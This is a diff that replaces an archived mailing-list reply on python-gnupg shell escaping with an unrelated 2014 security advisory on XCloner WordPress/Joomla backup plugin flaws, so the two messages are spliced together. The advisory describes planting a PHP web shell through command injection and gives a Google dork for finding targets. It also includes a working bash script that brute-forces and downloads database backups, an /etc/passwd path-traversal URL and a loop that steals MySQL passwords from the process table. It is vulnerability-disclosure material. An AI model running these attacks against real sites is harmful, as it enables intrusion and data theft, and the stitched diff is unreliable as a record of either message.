@@ -1,41 +1,296 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/02/10/9
-Message-ID: <52F8C199.9070005@debian.org>
-Date: Mon, 10 Feb 2014 12:10:01 +0000
-From: Simon McVittie <smcv@...ian.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: CVE request: python-gnupg before 0.3.5 shell injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/06/1
+Message-id: <21A99256-9B57-4574-BDC4-33BD6E998676@me.com>
+Date: Wed, 05 Nov 2014 18:59:30 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: XCloner Wordpress/Joomla! backup Plugin v3.1.1 (Wordpress) v3.5.1 (Joomla!) Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On 09/02/14 21:40, cve-assign@...re.org wrote:
-> First, it seems that the shell_quote function in version 0.3.5 has
-> two fundamentally different problems with different flaw types and 
-> different discoverers.
+Title: XCloner Wordpress/Joomla! backup Plugin v3.1.1 (Wordpress) v3.5.1 (Joomla!) Vulnerabilities
+Author: Larry W. Cashdollar, @_larry0
+Date: 10/17/2014
+Download: https://wordpress.org/plugins/xcloner-backup-and-restore/
+Download: http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665
+Downloads: Wordpress 313,647 Joomla! 515745 StandAlone 69175
+Website: http://www.xcloner.com
+Advisory: http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/
+Vendor: Notified 10/17/14 Ovidiu Liuta, @thinkovi Acknowledged & no other response.
+CVEID: Requested, TDB.
+OSVDBID:114176,114177,114178,114179,114180
 
-I think the underlying problem here is that a library for interacting
-with GNUPG from Python is trying to implement Unix shell escaping.
-Unix shell escaping is subtle and easy to get wrong, so libraries
-whose intended scope does not include "miscellaneous OS/runtime
-utilities" should be delegating this to a better-tested and
-better-audited implementation.
+Description: “XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.”
 
-If possible, the preferred way to start a subprocess should be without
-going via /bin/sh: in Python, using functions from the subprocess
-module, without using the argument shell=True, achieves this. This is
-analogous to posix_spawn() (or fork()/exec()) in plain C,
-g_spawn_[a]sync() in GLib and so on.
+Vulnerabilities:  There are multiple vulnerabilities I’ve discovered in this plugin, they are as follows.
 
-If python-gnupg really does need to go via a shell, analogous to
-system() in plain C or g_spawn_command_line_[a]sync() in GLib, then it
-should use a library function analogous to GLib's g_shell_quote().
+1. Arbitrary command execution.
+2. Clear text MySQL password exposure through html text box under configuration panel.
+3. Database backups exposed to local users due to open file permissions.
+4. Unauthenticated remote access to backup files via easily guessable file names.
+5. Authenticated remote file access. 
+6. MySQL password exposed to process table.
 
-Python's shlex.quote() seems ideal for this, but unfortunately it's
-new in version 3.3. Python 2.7 does document pipes.quote(), and the
-documentation indicates that pipes.quote() may have been
-present-but-undocumented in previous versions.
+Arbitrary Command Execution
 
-As a worst case, as much as I hate to encourage embedded code copies,
-copying the implementation of shlex.quote() or pipes.quote() seems
-likely to yield better results than reimplementing it.
+Plugin allows arbitrary commands to be executed by an authenticated user.  The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields.
 
-    S
+PoC
+All input fields I believe are vulnerable, I’ve chosen the backup filename and a wget of sh.txt which is simply <?php passthru($_GET)?> into a writeable directory by www-data.
+
+Screenshots available at the advisory URL above.
+
+All user configurable variables are vulnerable, these variables need to be sanitized before being passed to the exec() function for execution.
+$_CONFIG[tarpath]
+$exclude
+$_CONFIG['tarcompress']
+$_CONFIG['filename']
+$_CONFIG['exfile_tar']
+$_CONFIG[sqldump]
+$_CONFIG['mysql_host']
+$_CONFIG['mysql_pass']
+$_CONFIG['mysql_user']
+$database_name
+$sqlfile
+$filename
+
+Vulnerable code  
+
+./cloner.functions.php:
+
+1672       exec($_CONFIG[tarpath] . " $exclude -c" . $_CONFIG['tarcompress'] . "vf $filename ./administrator/backups/index.html");
+1673       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/database-sql.sql");
+1674       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/htaccess.txt");
+1675       exec($_CONFIG[tarpath] . " -" . $_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/perm.txt");
+
+1695-          if ($_REQUEST[cron_dbonly] != 1) {
+1696:              exec($_CONFIG[tarpath] . " $excl_cmd " . " -X " . $_CONFIG['exfile_tar'] . "  -chv" . $_CONFIG['tarcompress'] . "f $filename ./");
+1697-          } else {
+1698-
+1699-
+1700:      exec($_CONFIG[tarpath] . "  -" . $_CONFIG['tarcompress'] . "cvf $filename ./administrator/backups/database-sql.sql");
+1701-
+1702-              if (is_array($databases_incl)) {
+1703-                  foreach ($databases_incl as $database_name)
+1704-                      if ($database_name != "") {
+1705:                          exec($_CONFIG[tarpath] . "  -" . $_CONFIG['tarcompress'] . "vf $filename --update  ./administrator/backups/" . $database_name . "-sql.sql");
+1706-                      }
+1707-              }
+1708-          }
+--
+1873-  {
+1874-      //$sizeInBytes = filesize($path);
+1875-      $sizeInBytes = sprintf("%u", filesize($path));
+1876:      if ((!$sizeInBytes) and (function_exists("exec"))){
+1877-          $command = "ls -l \"$path\" | cut -d \" \" -f 5";
+1878:          $sizeInBytes = @exec($command);
+1879-      }
+
+2010-      if ($_CONFIG['sql_mem']) {
+2011:          exec($_CONFIG[sqldump] . " -h " . $_CONFIG['mysql_host'] . " -u " . $_CONFIG['mysql_user'] . " -p" . $_CONFIG['mysql_pass'] . " " . $dbname . " > " . $sqlfile . " $drop --allow-k
+eywords " . $ex_dump);
+2012-
+2013-          if (get_filesize($sqlfile) > 0)
+2014-              $databaseResult = LM_DATABASE_BACKUP_COMPLETED . ' ( ' . getFileSizeText(get_filesize($sqlfile)) . ' )';
+2015-          else
+2016-              $databaseResult = LM_MSG_BACK_14;
+2017-
+2018:          exec("chmod 777 $sqlfile");
+2019-
+2020-          return $sqlfile;
+2021-      }
+
+./classes/fileRecursion.php
+339-    public static function getFileSize($file){
+340-
+341-      $sizeInBytes = sprintf("%u", filesize($file));
+342:      if ((!$sizeInBytes) and (function_exists("exec"))){
+343-          $command = "ls -l \"$file\" | cut -d \" \" -f 5";
+344:          $sizeInBytes = @exec($command);
+345-      }
+346-
+347-      return $sizeInBytes;
+./restore/XCloner.php
+290-    }else{
+291-            if($ext == '.tgz') $compress = 'z';
+292-            else $compress = '';
+293:            shell_exec("tar -x".$compress."pf $file -C $_CONFIG[output_path]");
+294-    }
+295-}
+
+
+1077-   if($_REQUEST['use_mysqldump'] == 1){
+1078:           echo shell_exec($_REQUEST['mysqldump_path']." -u ".$_REQUEST[mysql_username]." -p".$_REQUEST[mysql_pass]." -h ".$_REQUEST[mysql_server]." ".$_REQUEST[mysql_db]." < ".$sqlfile);
+1079-           return;
+1080-    }
+
+
+
+
+Clear Text MySQL Database Password
+
+
+The plugin also returns the MySQL clear text password via html text box back to the user in the configuration panel.  A password should never be repeated back to you in clear text.  The plugin will happily send this over a clear text connection.
+
+
+ Screen Shot 2014-10-17 at 9.14.04 PM.png 
+
+
+
+
+
+
+
+
+
+Remote Database Download & Local File Permissions
+
+
+The default recommend path for backup storage is /usr/share/wordpress/administrator/backups.
+An index.html file is created under this directory to prevent casual browsing however the file names are easily predictable. From the installation instructions:
+
+
+“XCloner is a tool that will help you manage your website backups, generate/restore/move so your website will be always secured! With XCloner you will be able to clone your site to any other location with just a few clicks. Don't forget to create the 'administrator/backups' directory in your Wordpress root and make it fully writeable.”
+
+
+The format of the filenames are: backup_year-month-day_month_24hour_minute_domainname-sql-OPTIONS.tar where
+OPTIONS could be either -sql-drop, -sql-nodrop or -nosql depending on options selected during time of backup.  
+The domain name is set by the HTTP_HOST header from line 88 of  cloner.config.php:
+
+
+88: $_CONFIG['mosConfig_live_site']=$_SERVER['HTTP_HOST'];
+
+
+root@...ry:/usr/share/wordpress/administrator/backups# ls -l
+total 129432
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:15 backup_2014-10-29_10-14_testsite-sql-nodrop.tar
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:19 backup_2014-10-29_10-19_testsite-sql-nodrop.tar
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:24 backup_2014-10-29_10-24_testsite-sql-nodrop.tar
+
+
+
+
+These file permissions also expose the contents of the databases to any local system users.
+
+
+File naming convention code is as follows:
+
+
+   1327       $domainname = $_CONFIG['mosConfig_live_site'];
+   1351       if ($_REQUEST['bname'] == "") {
+   1352           if ($backupDatabase == 1) {
+   1353               if ($_REQUEST['dbbackup_drop']) {
+   1354                   $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-sql-drop' . $f_ext;
+   1355               } else {
+   1356 
+   1357                   $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-sql-nodrop' . $f_ext;
+   1358               }
+   1359           } else
+   1360               $filename1 = 'backup_' . date("Y-m-d_H-i") . '_' . $domainname . '-nosql' . $f_ext;
+   1361       } else {
+
+
+
+
+ snapshot3.png 
+
+
+
+
+
+I’ve found a few vulnerable websites with the google dork:
+
+
+https://www.google.com/#q=inurl:+administrator%2Fbackups
+
+
+A PoC:
+
+
+lwc@...dpress:~$ bash exp.sh 192.168.0.26
+[+] Location http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar Found
+[+] Received HTTP/1.1 200 OK
+Downloading......
+--2014-10-30 13:02:51--  http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar
+Connecting to 192.168.0.26:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 44400640 (42M) [application/x-tar]
+Saving to: `backup_2014-10-30_06-27_-sql-nodrop.tar.1'
+
+
+100%[========================================>] 44,400,640  56.9M/s   in 0.7s    
+
+
+2014-10-30 13:02:52 (56.9 MB/s) - `backup_2014-10-30_06-27_-sql-nodrop.tar.1' saved [44400640/44400640]
+
+
+[+] Location http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar Found
+[+] Received HTTP/1.1 200 OK
+Downloading......
+--2014-10-30 13:02:52--  http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar
+Connecting to 192.168.0.26:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 44400640 (42M) [application/x-tar]
+Saving to: `backup_2014-10-30_06-33_-sql-nodrop.tar.1'
+
+
+100%[========================================>] 44,400,640  64.1M/s   in 0.7s    
+
+
+2014-10-30 13:02:53 (64.1 MB/s) - `backup_2014-10-30_06-33_-sql-nodrop.tar.1' saved [44400640/44400640]
+
+
+#!/bin/bash
+#Exploit to download XCloner v3.1.1 Database backups OSVDB: 114177
+#Larry W. Cashdollar, @_larry0
+#XCloner recommends a backup storage path under the WP root directory
+#it uses a 0 size index.html file to block indexing.
+#we can try to brute force the filenames it creates.
+
+
+MONTH=10
+DAY=30
+#May need to set the DOMAIN to $1 the target depending on how WP is configured.
+DOMAIN=
+
+
+for y in `seq -w 1 24`; do
+        for x in `seq -w 1 59`; do 
+                CPATH="http://$1/administrator/backups/backup_2014-"$MONTH"-"$DAY"_"$y"-"$x"_$DOMAIN-sql-nodrop.tar";
+                 RESULT=`curl -s --head $CPATH|grep 200`;
+                if [ -n "$RESULT" ]; then
+                 echo "[+] Location $CPATH Found";
+                 echo "[+] Received $RESULT";
+                 echo "Downloading......";
+                 wget $CPATH
+                fi;
+        done
+done
+
+
+
+
+Remote File Access
+
+
+The user has to have administrative rights, but the backup downloader doesn’t check the path
+for ../.
+
+
+http://192.168.0.33/wp-admin/admin-ajax.php?action=json_return&page=xcloner_show&option=com_cloner&task=download&file=../../../../etc/passwd
+
+
+Will download /etc/passwd off the remote system.
+
+
+MySQL Database Password Exposed to Process Table
+
+
+Local users can steal the MySQL password by watching the process table:
+
+
+lwc@...dpress:/etc/wordpress$ while (true); do ps -ef |grep [m]ysqldump; done
+www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -pPASSWORDHERE wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords 
+www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords
+www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -ps3cur1ty wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords 
+www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords
+^C
